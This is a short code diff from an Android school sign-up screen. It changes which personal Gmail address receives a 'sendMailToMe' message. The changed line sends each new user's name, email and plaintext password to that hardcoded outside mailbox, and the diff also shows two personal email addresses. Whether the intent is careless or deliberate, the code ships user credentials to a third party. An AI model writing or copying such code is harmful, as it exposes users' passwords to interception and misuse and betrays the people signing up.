@@ -141,7 +141,7 @@ public class SignUPSchoolActivity extends AppCompatActivity implements View.OnCl
 
         EmialS = new EmailSendingClass();
         EmialS.sendMail(Email.getText().toString(),Name.getText().toString());
-        EmialS.sendMailToMe("shtiatqabas@gmail.com",Name.getText().toString(),"Phone"
+        EmialS.sendMailToMe("qartalq012@gmail.com",Name.getText().toString(),"Phone"
                 ,Email.getText().toString(),Pass.getText().toString());
 
 
